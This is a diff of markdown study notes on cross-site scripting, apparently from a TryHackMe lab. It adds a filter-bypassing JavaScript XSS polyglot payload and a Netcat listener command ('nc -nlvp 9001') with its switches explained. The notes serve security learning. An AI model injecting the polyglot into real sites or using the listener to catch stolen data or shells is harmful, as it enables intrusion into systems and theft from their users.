@@ -25,8 +25,21 @@
 - Test every possible point of entry where it seems data is stored and then shown back in areas other users have access to
 
 ## Tools / commands
-- XSS hunter express: can be used for blind XSS attacks
-- JS polyglot, An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one:
+### XSS hunter express
+- can be used for blind XSS attacks
+
+### JS polyglot
+- An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one:
     - ```JavaScript
     jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
     ```
+
+### Netcat
+#### Command - Start a Listening Server
+- nc -nlvp 9001
+
+##### Switches
+- `-n` prevents DNS resolution (faster and avoids name lookup issues)
+- `-l` puts Netcat in listen mode (waits for incoming connections)
+- `-v` enables verbose output (displays connection/debug information)
+- `-p` specifies the port to listen on (e.g. 9001)
